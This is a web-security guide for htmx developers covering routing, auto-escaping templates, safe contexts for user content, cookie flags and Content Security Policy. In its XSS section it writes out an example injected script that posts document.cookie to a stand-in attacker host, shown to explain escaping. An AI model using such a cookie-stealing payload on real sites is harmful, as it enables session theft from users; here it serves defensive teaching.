+++
title = "Web Security Basics (with htmx)"
date = 2024-02-06
[taxonomies]
author = ["Alexander Petros"]
tag = ["posts"]
+++

As htmx has gotten more popular, it's reached communities who have never written server-generated HTML before. Dynamic HTML templating was, and still is, the standard way to use many popular web frameworks—like Rails, Django, and Spring—but it is a novel concept for those coming from Single-Page Application (SPA) frameworks—like React and Svelte—where the prevalence of JSX means you never write HTML directly.

But have no fear! Writing web applications with HTML templates is a slightly different security model, but it's no harder than securing a JSX-based application, and in some ways it's a lot easier.

## Who is guide this for?

These are web security basics with htmx, but they're (mostly) not htmx-specific—these concepts are important to know if you're putting *any* dynamic, user-generated content on the web.

For this guide, you should already have a basic grasp of the semantics of the web, and be familiar with how to write a backend server (in any language). For instance, you should know not to create `GET` routes that can alter the backend state. We also assume that you're not doing anything super fancy, like making a website that hosts other people's websites. If you're doing anything like that, the security concepts you need to be aware of far exceed the scope of this guide.

We make these simplifying assumptions in order to target the widest possible audience, without including distracting information—obviously this can't catch everyone. No security guide is perfectly comprehensive. If you feel there's a mistake, or an obvious gotcha that we should have mentioned, please reach out and we'll update it.

## The Golden Rules

Follow these four simple rules, and you'll be following the client security best practices:

1. Only call routes you control
2. Always use an auto-escaping template engine
3. Only serve user-generated content inside HTML tags
4. If you have authentication cookies, set them with `Secure`, `HttpOnly`, and `SameSite=Lax`

In the following section, I'll discuss what each of these rules does, and what kinds of attack they protect against. The vast majority of htmx users—those using htmx to build a website that allows users to login, view some data, and update that data—should never have any reason to break them.

Later on I will discuss how to break some of these rules. Many useful applications can be built under these constraints, but if you do need more advanced behavior, you'll be doing so with the full knowledge that you're increasing the conceptual burden of securing your application. And you'll have learned a lot about web security in the process.

## Understanding the Rules

### Only call routes you control

This is the most basic one, and the most important: **do not call untrusted routes with htmx.**

In practice, this means you should only use relative URLs. This is fine:

```html
<button hx-get="/events">Search events</button>
```

But this is not:

```html
<button hx-get="https://google.com/search?q=events">Search events</button>
```

The reason for this is simple: htmx inserts the response from that route directly into the user's page. If the response has a malicious `<script>` inside it, that script can steal the user's data. When you don't control the route, you cannot guarantee that whoever does control the route won't add a malicious script.

Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are [specific to the layout of your application](https://htmx.org/essays/hypermedia-apis-vs-data-apis/), so there is almost never any reason you'd *want* to insert someone else's HTML into your page. All you have to do is make sure you only call your own routes (htmx 2 will actually disable calling other domains by default).

Though it's not quite as popular these days, a common SPA pattern was to separate the frontend and backend into different repositories, and sometimes even to serve them from different URLs. This would require using absolute URLs in the frontend, and often, [disabling CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). With htmx (and, to be fair, modern React with NextJS) this is an anti-pattern.

Instead, you simply serve your HTML frontend from the same server (or at least the same domain) as your backend, and everything else falls into place: you can use relative URLs, you'll never have trouble with CORS, and you'll never call anyone else's backend.

htmx executes HTML; HTML is code; never execute untrusted code.

### Always use an auto-escaping template engine

When you send HTML to the user, all dynamic content must be escaped. Use a template engine to construct your responses, and make sure that auto-escaping is on.

Fortunately, all template engines support escaping HTML, and most of them enable it by default. Below are just a few examples.

| Language | Template Engine | Escapes HTML by default? |
| ---- | ---- | ---- |
| JavaScript | Nunjucks | Yes |
| JavaScript | EJS | Yes, with `<%= %>` |
| Python | DTL | Yes |
| Python | Jinja | **Sometimes** (Yes, in Flask)|
| Ruby | ERB | Yes, with `<%= %>` |
| PHP | Blade | Yes |
| Go | html/template | Yes |
| Java | Thymeleaf | Yes |
| Rust | Tera | Yes |

The kind of vulnerability this prevents is often called a Cross-Site Scripting (XSS) attack, a term that is [broadly used](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction) to mean the injection of any unexpected content into your webpage. Typically, an attacker uses your APIs to store malicious code in your database, which you then serve to your other users who request that info.

For example, let's say you're building a dating site, and it lets users share a little bio about themselves. You'd render that bio like this, with `{{ user.bio }}` being the bio stored in the database:

```html
<p>
{{ user.bio }}
</p>
```

If a malicious user wrote a bio with a script element in it—like one that sends the client's cookie to another website—then this HTML will get sent to every user who views that bio:

```html
<p>
<script>
  fetch('evilwebsite.com', { method: 'POST', body: document.cookie })
</script>
</p>
```

Fortunately this one is so easy to fix that you can write the code yourself. Whenever you insert untrusted (i.e. user-provided) data, you just have to replace eight characters with their non-code equivalents. This is an example using JavaScript:

```js
/**
 * Replace any characters that could be used to inject a malicious script in an HTML context.
 */
export function escapeHtmlText (value) {
  const stringValue = value.toString()
  const entityMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&grave;',
    '=': '&#x3D;'
  }

  // Match any of the characters inside /[ ... ]/
  const regex = /[&<>"'`=/]/g
  return stringValue.replace(regex, match => entityMap[match])
}
```

This tiny JS function replaces `<` with `&lt;`, `"` with `&quot;`, and so on. These characters will still render properly as `<` and `"` when they're used in the text, but can't be interpreted as code constructs. The previous malicious bio will now be converted into the following HTML:

```html
<p>
&lt;script&gt;
  fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data: document.cookie })
&lt;/script&gt;
</p>
```

which displays harmlessly as text.

Fortunately, as established above, you don't have to do your escaping manually—I just wanted to demonstrate how simple these concepts are. Every template engine has an auto-escaping feature, and you're going to want to use a template engine anyway. Just make sure that escaping is enabled, and send all your HTML through it.

### Only serve user-generated content inside HTML tags

This is an addendum to the template engine rule, but it's important enough to call out on its own. Do not allow your users to define arbitrary CSS or JS content, even with your auto-escaping template engine.

```html
<!-- Don't include inside script tags -->
<script>
  const userName = {{ user.name }}
</script>

<!-- Don't include inside CSS tags -->
<style>
  h1 { color: {{ user.favorite_color }} }
</style>
```

And, don't use user-defined attributes or tag names either:
```html
<!-- Don't allow user-defined tag names -->
<{{ user.tag }}></{{ user.tag }}>

<!-- Don't allow user-defined attributes -->
<a {{ user.attribute }}></a>

<!-- User-defined attribute VALUES are sometimes okay, it depends -->
<a class="{{ user.class }}"></a>

<!-- Escaped content is always safe inside HTML tags (this is fine) -->
<a>{{ user.name }}</a>
```

CSS, JavaScript, and HTML attributes are ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) places where it's not safe to allow arbitrary user input, even if it's escaped. Escaping will protect you from some vulnerabilities here, but not all of them; the vulnerabilities are varied enough that it's safest to default to not doing *any* of these.

Inserting user-generated text directly into a script tag should never be necessary, but there *are* some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.

## Secure your cookies

The best way to do authentication with htmx is using cookies. And because htmx encourages interactivity primarily through first-party HTML APIs, it is usually trivial to enable the browser's best cookie security features. These three in particular:

* `Secure` - only send the cookie via HTTPS, never HTTP
* `HttpOnly` - don't make the cookie available to JavaScript via `document.cookie`
* `SameSite=Lax` - don't allow other sites to use your cookie to make requests, unless it's just a plain link

To understand what these protect you against, let's go over the basics. If you come from JavaScript SPAs, where it's common to authenticate using the `Authorization` header, you might not be familiar with how cookies work. Fortunately they're very simple. (Please note: this is not an "authentication with htmx" tutorial, just an overview of cookie tokens generally)

If your users log in with a `<form>`, their browser will send your server an HTTP request, and your server will send back a response that looks something like this:

```
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: token=asd8234nsdfp982

[HTML content]
```

That token corresponds to the user's current login session. From now on, every time that user makes a request to any route at `yourdomain.com`, the browser will include that cookie from `Set-Cookie` in the HTTP request.

```
GET /users HTTP/1.1
Host: yourdomain.com
Cookie: token=asd8234nsdfp982
```

Each time someone makes a request to your server, it needs to parse out that token and determine if it's valid. Simple enough.

You can also set options on that cookie, like the ones I recommended above. How to do this differs depending on the programming language, but the outcome is always an HTTP request that looks like this:

```
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax

[HTML content]
```

So what do the options do?

The first one, `Secure`, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user's login token, should *never* be sent over an insecure connection.

The second option, `HttpOnly`, means that the browser will not expose the cookie to JavaScript, ever (i.e. it won't be in [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)). Even if someone is able to insert a malicious script, like in the `evilwebsite.com` example above, that malicious script cannot access the user's cookie or send it to `evilwebsite.com`. The browser will only attach the cookie when the request is made to the website the cookie came from.

Finally, `SameSite=Lax` locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client's browser to make a malicious request to the `yourdomain.com` server—like a POST request. The `SameSite=Lax` setting tells the browser not to send the `yourdomain.com` cookie if the site that made the request isn't `yourdomain.com`—unless it's a straightforward `<a>` link navigating to your page. This is *mostly* browser default behavior now, but it's important to still set it directly.

In 2024, `SameSite=Lax` is [usually enough](https://security.stackexchange.com/questions/252300/do-i-still-need-a-csrf-token) to protect against CSRF, but there are [additional mitigations](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) you can consider as well for more sensitive or complicated cases.

**Important Note:** `SameSite=Lax` only protects you at the domain level, not the subdomain level (i.e. `yourdomain.com`, not `yoursite.github.io`). If you're doing user login, you should always be doing that at your own domain in production. Sometimes the [Public Suffixes List](https://security.stackexchange.com/questions/223473/for-samesite-cookie-with-subdomains-what-are-considered-the-same-site) will protect you, but you shouldn't rely on that.

## Breaking the rules

We started with the easiest, most secure practices—that way mistakes lead to a broken UX, which can be fixed, rather than stolen data, which cannot.

Some web applications demand more complicated functionality, with more user customization; they also require more complicated security mechanisms. You should only break these rules if you are convinced that it is absolutely necessary, and the desired functionality cannot be implemented through alternative means.

### Calling untrusted APIs

Calling untrusted HTML APIs is lunacy. Never do this.

There are cases where you might want to call someone else's JSON API from the client, and that's fine, because JSON cannot execute arbitrary scripts. In that case, you'll probably want to do something with that data to turn it into HTML. Don't use htmx to do that—use `fetch` and `JSON.parse()`; if the untrusted API pulls a fast one and returns HTML instead of JSON, `JSON.parse()` will just fail harmlessly.

Keep in mind that the JSON you parse might have a *property* that is formatted as HTML, though:

```json
{ "name": "<script>alert('Hahaha I am a script')</script>" }
```

Therefore, don't insert JSON values as HTML either—use `innerText` if you're doing something like that. This is well outside the realm of htmx-controlled UI though.

The 2.0 version of htmx will include an `innerText` swap, if you want to call someone else's API directly from the client and just put that text into the page.

### Custom HTML controls

Unlike calling untrusted HTML routes, there are a lot of good reasons to let users do dynamic HTML-formatted content.

What if, say, you want to let users link to an image?

```html
<img src="{{ user.fav_img }}">
```

Or link to their personal website?
```html
<a href="{{ user.fav_link }}">
```

The default "escape everything" approach escapes forward slashes, so it will bork user-submitted URLs.

You can fix this in a couple of ways. The simplest, and safest, trick is to let users customize these values, but don't let them define the literal text. In the image example, you might upload the image to your own server (or S3 bucket, or the like), generate the link yourself, and then include it, unescaped. In nunjucks, you use the [safe](https://mozilla.github.io/nunjucks/templating.html#safe) function:

```html
<img src="{{ user.fav_img_s3_url | safe }}">
```

Yes, you're including unescaped content, but it's a link that you generated, so you know it's safe.

You can handle custom CSS in the same way. Rather than let your users specify the color directly, give them some limited choices, and set the choices based on their input.

```css
{% if user.favorite_color === 'red' %}
h1 { color: 'red'; }
{% else %}
h1 { color: 'blue'; }
{% endif %}
```

In that example, the user can set `favorite_color` to whatever they like, but it's never going to be anything but red or blue. A less trivial example might ensure that only properly-formatted hex codes can be entered, using a regex. You get the idea.

Depending on what kind of customization you're supporting, securing it might be relatively easy, or quite difficult. Some attributes are ["safe sinks,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#safe-sinks) which means that their values will never be interpreted as code; these are quite easy to secure. If you're going to include dynamic input in ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) you need to research *what* is dangerous about those contexts, and ensure that that kind of input won't make it into the document.

If you want to let users link to arbitrary websites or images, for instance, that's a lot more complicated. First, make sure to put the attributes inside quotes (most people do this anyway). Then you will need to do something like write a custom escaping function that escapes everything *but* forward slashes (and possibly ampersands), so the link will work properly.

But even if you do that correctly, you are introducing some new security challenges. That image link can be used to track your users, since your users will request it directly from someone else's server. Maybe you're fine with that, maybe you include other mitigations. The important part is that you are aware that introducing this level of customization comes with a more difficult security model, and if you don't have the bandwidth to research and test it, you shouldn't do it.

### Non-cookie authentication

JavaScript SPAs sometimes authenticate by saving a token in the client's local storage, and then adding that to the [`Authorization` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) of each request. Unfortunately, there's no way to set the `Authorization` header without using JavaScript, which is not as secure; if it's available to your trusted JavaScript, it's available to attackers if they manage to get a malicious script onto your page. Instead, use a cookie (with the above attributes), which can be set and secured without touching JavaScript at all.

Why is there an `Authorization` header but no way to set it with hypermedia controls? Well, that's just one of WHATWG's ~~outrageous omissions~~ little mysteries.

You might need to use an `Authorization` header if you're authenticating the user's client with an API that you don't control, in which case the regular precautions about routes you don't control apply.

## Bonus: Content Security Policy

You should also be aware of the [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) (CSP), which uses HTTP headers to set rules about the kind of content that your page is allowed to run. You can restrict the page to only load images from your domain, for example, or to disable inline scripts.

This is not one of the golden rules because it's not as easy to apply universally. There's no "one size fits most" CSP. Some htmx applications make use of inline scripting—the [`hx-on` attribute](https://htmx.org/attributes/hx-on/) is a generalized attribute listener that can evaluate arbitrary scripts (although [it can be disabled](https://htmx.org/docs/#configuration-options) if you don't need it). Sometimes inline scripts are appropriate to preserve [locality of behavior](https://htmx.org/essays/locality-of-behaviour/) on a application that is sufficiently secured against XSS, sometimes inline scripts aren't necessary and you can adopt a stricter CSP. It all depends on your application's security profile—it's on to you to be aware of the options available to you and able to perform that analysis.

## Is this a step back?

You might reasonably wonder: if I didn't have to know these things when I was building SPAs, isn't htmx a step back in security? We would challenge both parts of that statement.

This article is not intended to be a defense of htmx's security properties, but there are a lot of areas where hypermedia applications are, by default, a lot more secure than JSON-based frontends. HTML APIs only send back the information that's supposed to be rendered—it's a lot easier for unintended data to "hide" in a JSON response and leak to the user. Hypermedia APIs also don't lend themselves to implementing a generalized query language, like GraphQL, on the client, which [require a *massively* more complicated security model](https://intercoolerjs.org/2016/02/17/api-churn-vs-security.html). Flaws of all kinds hide in your application's complexity; hypermedia applications are, generally speaking, less complex, and therefore easier to secure.

You also need to know about XSS attacks if you're putting dynamic content on the web, period. A developer who doesn't understand how XSS works won't understand what's dangerous about using React's [`dangerouslySetInnerHTML`](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)—and they'll go ahead and set it the first time they need to render rich user-generated text. It is the library's responsibility to make those security basics as easy to find as possible; it has always been the developer's responsibility to learn and follow them.

This article is organized to making securing your htmx application a "pit of success"—follow these simple rules and you are very unlikely to code an XSS vulnerability. But it's impossible to write a library that's going to be secure in the hands of a developer who refuses to learn *anything* about security, because security is about controlling access to information, and it will always be the human's job to explain to the computer precisely who has access to what information.

Writing secure web applications is *hard*. There are plenty of easy pitfalls related to routing, database access, HTML templating, business logic, and more. And yet, if security is only the domain of security experts, then only security experts should be making web applications. Maybe that should be the case! But if only security experts are making web applications, they definitely know how to use a template engine correctly, so htmx will be no trouble for them.

For everyone else:

1. Don't call untrusted routes
2. Use an auto-escaping template engine
3. Only put user-generated content inside HTML tags
4. Secure your cookies
